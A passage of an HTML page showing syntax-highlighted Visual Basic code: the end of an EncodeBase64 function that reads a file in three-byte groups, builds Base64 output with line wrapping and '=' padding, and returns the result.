    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">Step</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">72</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
            </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">

        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
        </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
        
    </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">

    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
    
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc0">

        </span><span class="sc3">Else</span><span class="sc0">
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
            
            </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=="</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
        </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    
    </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">
    </span><span class="sc7">EncodeBase64</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0">
    
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span></div></body>
</html>
